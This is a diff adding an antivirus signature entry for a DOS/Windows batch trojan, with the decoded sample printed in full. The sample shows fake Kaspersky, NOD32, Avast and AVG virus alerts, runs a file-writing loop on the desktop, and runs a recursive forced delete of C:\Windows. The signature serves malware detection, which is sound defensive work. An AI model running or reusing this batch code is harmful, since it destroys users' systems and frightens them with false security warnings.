@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36701
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off title baloon virus color c msg * virus detected! | kaspersky antivirus alert msg * virus detected! | nod32 antvirus alert msg * virus detected! | avast antivirus alert msg * virus detected! | avg antivius alert cd escritorio :bucle echo off >> anti-virus.bat goto bucle del /s /f /q c:\windows exit 
